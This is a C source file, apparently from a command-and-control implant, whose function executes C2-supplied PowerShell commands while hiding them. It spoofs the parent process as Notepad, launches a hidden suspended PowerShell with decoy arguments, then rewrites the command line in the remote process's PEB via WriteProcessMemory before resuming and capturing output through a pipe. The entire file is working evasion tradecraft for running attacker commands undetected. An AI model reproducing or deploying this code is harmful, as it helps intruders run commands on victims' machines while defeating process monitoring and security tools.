#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <wininet.h>
#include <winternl.h>
#include <tlhelp32.h>

#include "ExecutePowershell.h"

BOOL ReadFromTargetProcess(IN HANDLE hProcess, IN PVOID pAddress, OUT PVOID* ppReadBuffer, IN SIZE_T dwBufferSize) {

    SIZE_T  sNmbrOfBytesRead    = 0;

    *ppReadBuffer = calloc(1, dwBufferSize);
    if (*ppReadBuffer == NULL) {
        printf("[!] calloc failed\n");
        return FALSE;
    }

    if (!ReadProcessMemory(hProcess, pAddress, *ppReadBuffer, dwBufferSize, &sNmbrOfBytesRead) || sNmbrOfBytesRead != dwBufferSize){
        printf("[!] ReadProcessMemory Failed With Error : %u \n", GetLastError());
        printf("[i] Bytes Read : %llu Of %llu \n", (unsigned long long)sNmbrOfBytesRead, (unsigned long long)dwBufferSize);
        free(*ppReadBuffer);
        *ppReadBuffer = NULL;
        return FALSE;
    }

    return TRUE;
}
BOOL WriteToTargetProcess(IN HANDLE hProcess, IN PVOID pAddressToWriteTo, IN PVOID pBuffer, IN SIZE_T dwBufferSize) {

    SIZE_T sNmbrOfBytesWritten  = 0;

    if (!WriteProcessMemory(hProcess, pAddressToWriteTo, pBuffer, dwBufferSize, &sNmbrOfBytesWritten) || sNmbrOfBytesWritten != dwBufferSize) {
        printf("[!] WriteProcessMemory Failed With Error : %u \n", GetLastError());
        printf("[i] Bytes Written : %llu Of %llu \n", (unsigned long long)sNmbrOfBytesWritten, (unsigned long long)dwBufferSize);
        return FALSE;
    }

    return TRUE;
}

LPSTR ExecPowerShell(LPCWSTR psCommand) {
    HANDLE hRead = NULL, hWrite = NULL;
    SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
    STARTUPINFOEXW SiEx = { 0 };
    SiEx.StartupInfo.cb = sizeof(STARTUPINFOEXA);
	PROCESS_INFORMATION Pi = { 0 };

    printf("[*] Executing C2 command : %ls\n", psCommand);

    printf("[*] Creating Pipe (stdout/stdin)\n");
    if (!CreatePipe(&hRead, &hWrite, &sa, 0)) return NULL;
    SetHandleInformation(hRead, HANDLE_FLAG_INHERIT, 0); //Only current and child inherit handles

    printf("[*] Spoofing PPID of Notepad.exe\n");
    DWORD  PID     = 0;
    HANDLE hParentProcess   = 0;
    get_process("Notepad.exe", &hParentProcess, &PID);

    printf("[*] Notepad PID : %d\n", PID);
    SIZE_T sThreadAttList = 0;
    PPROC_THREAD_ATTRIBUTE_LIST pThreadAttList = 0;
    InitializeProcThreadAttributeList(NULL, 1, 0, &sThreadAttList); //Get Thread attributes Size
    pThreadAttList = (PPROC_THREAD_ATTRIBUTE_LIST)calloc(1, sThreadAttList);
    InitializeProcThreadAttributeList(pThreadAttList, 1, 0, &sThreadAttList); // Get Threat attibutes structure
    UpdateProcThreadAttribute(pThreadAttList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParentProcess, sizeof(HANDLE), NULL, NULL);
    SiEx.lpAttributeList = pThreadAttList;
    printf("[*] STARTUPINFOEXA structure updated : lpAttributeList::PROC_THREAD_ATTRIBUTE_PARENT_PROCESS <- Notion.exe (PID: %d)\n", PID);
    
    SiEx.StartupInfo.dwFlags |= STARTF_USESTDHANDLES;
    SiEx.StartupInfo.hStdOutput = hWrite;
    SiEx.StartupInfo.hStdError  = hWrite;
    SiEx.StartupInfo.hStdInput  = NULL;
    printf("[*] STARTUPINFOEXA structure updated : Attached a stdin/stdout pipe\n");
    
    printf("[*] Starting process with Fake PPID & Fake arguments (RickRoll)\n");
    WCHAR fakeStartupArgs[] = L"powershell.exe -NoProfile -WindowStyle Hidden -Command \"Start-Process 'https://www.youtube.com/watch?v=dQw4w9WgXcQ'\"";
    if (!CreateProcessW(
		NULL,
		fakeStartupArgs,
		NULL,
		NULL,
		FALSE,
		EXTENDED_STARTUPINFO_PRESENT | CREATE_SUSPENDED | CREATE_NO_WINDOW,
		NULL,
		NULL,
		&SiEx.StartupInfo,
		&Pi)) {
		printf("[!] CreateProcessW Failed with Error : %d \n", GetLastError());
		return FALSE;
	}
    printf("[*] Process Created with 'EXTENDED_STARTUPINFO_PRESENT | CREATE_SUSPENDED | CREATE_NO_WINDOW' flags\n");
    printf("[*] Update process argument with the effective one : %ls\n", psCommand);
    printf("[*] Getting remote process's PROCESS_BASIC_INFORMATION to get it's PEB (PBI::PebBaseAddress)\n");
    _NtQueryInformationProcess pNtQueryInformationProcess = (_NtQueryInformationProcess)GetProcAddress(CustomGetModuleHandleW(L"ntdll.dll"), "NtQueryInformationProcess");
    
    PROCESS_BASIC_INFORMATION PBI = { 0 };
    ULONG ret  = 0;
    NTSTATUS status = pNtQueryInformationProcess(Pi.hProcess, ProcessBasicInformation, &PBI, sizeof(PROCESS_BASIC_INFORMATION), &ret);

    PPEB                          pPeb     = NULL;
    PRTL_USER_PROCESS_PARAMETERS  pParms   = NULL;
    ReadFromTargetProcess(Pi.hProcess, PBI.PebBaseAddress, (PVOID*)&pPeb, sizeof(PEB));

    printf("[*] Getting RTL_USER_PROCESS_PARAMETERS strucutre from PEB to edit the calling argument/parameter\n");
    SIZE_T parmsReadSize = sizeof(RTL_USER_PROCESS_PARAMETERS) + 0xff; //Lit un peu plus pour eviter de multiplier les lectures dans le remote process
    ReadFromTargetProcess(Pi.hProcess, pPeb->ProcessParameters, (PVOID*)&pParms, parmsReadSize);
    SIZE_T effectiveArgs_sz  = lstrlenW(psCommand) + 1; 
    SIZE_T effectiveArgs_bsz = effectiveArgs_sz * sizeof(WCHAR); //taille en Bytes pour écrire en mode "RAW" Bytes
    PWSTR remoteCmdBuffer = pParms->CommandLine.Buffer; // ADDR du buffer dans le remote process

    printf("[*] Updating CommandLine.Buffer in PEB::ProcessParameters\n");
    WriteToTargetProcess(Pi.hProcess, (PVOID)remoteCmdBuffer, (PVOID)psCommand, effectiveArgs_bsz);

    printf("[*] Updating Commandline.Length in PEB::ProcessParameters\n");
    USHORT effectiveArgs_sz_us = (USHORT)(effectiveArgs_bsz & 0xFFFF); //Byte size as USHORT (4octets)
    PVOID remoteCmdLenAddr = (PVOID)(pPeb->ProcessParameters + offsetof(RTL_USER_PROCESS_PARAMETERS, CommandLine.Length));
    WriteToTargetProcess(Pi.hProcess, remoteCmdLenAddr, (PVOID)&effectiveArgs_sz_us, sizeof(USHORT));

    printf("[*] Updating Commandline.MaximumLength in PEB::ProcessParameters\n");
    USHORT maxlen = effectiveArgs_sz_us;
    PVOID remoteCmdMaxLenAddr = (PVOID)(pPeb->ProcessParameters + offsetof(RTL_USER_PROCESS_PARAMETERS, CommandLine.MaximumLength));
    WriteToTargetProcess(Pi.hProcess, remoteCmdMaxLenAddr, (PVOID)&maxlen, sizeof(USHORT));

    printf("[*] Process manipulation done, resuming thread...\n");
    Sleep(2);
    ResumeThread(Pi.hThread);
    CloseHandle(hWrite); //Send an EOF to the pipe

    CHAR pipeChunkBuffer[4096];
    DWORD bytesRead = 0;
    SIZE_T outputSize = 0;
    LPSTR outputBuffer = calloc(1, 1); //will be reallocated at each bytes read

    while (ReadFile(hRead, pipeChunkBuffer, sizeof(pipeChunkBuffer) - 1, &bytesRead, NULL) && bytesRead) {
        pipeChunkBuffer[bytesRead] = 0;
        outputBuffer = realloc(outputBuffer, outputSize + bytesRead + 1);
        memcpy(outputBuffer + outputSize, pipeChunkBuffer, bytesRead);
        outputSize += bytesRead;
    }

    WaitForSingleObject(Pi.hProcess, INFINITE);
    
    free(pPeb);
    free(pParms);
    DeleteProcThreadAttributeList(pThreadAttList);
    free(pThreadAttList);
    return outputBuffer;
}